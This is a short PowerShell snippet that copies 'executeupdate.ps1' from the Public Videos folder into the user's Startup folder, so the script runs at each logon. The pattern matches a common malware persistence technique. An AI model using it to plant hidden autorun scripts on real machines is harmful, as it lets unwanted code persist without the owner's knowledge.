$sourceFile = "C:\Users\Public\Videos\executeupdate.ps1"
$destinationFolder = [Environment]::GetFolderPath("Startup")

Copy-Item -Path $sourceFile -Destination $destinationFolder
